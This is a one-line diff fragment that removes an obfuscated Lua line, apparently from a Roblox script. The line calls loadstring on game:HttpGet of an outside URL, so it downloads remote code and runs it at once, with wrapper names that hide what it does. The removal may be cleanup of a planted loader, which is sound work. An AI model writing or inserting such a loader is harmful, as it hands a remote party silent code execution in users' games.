@@ -1,1 +1,0 @@
-pcoxdwgvCALL((pcoxdwgvCALL((loadstring),pcoxdwgvNAMECALL(game,"HttpGet","https://raw.soteria.rip/7464547739516579"))));
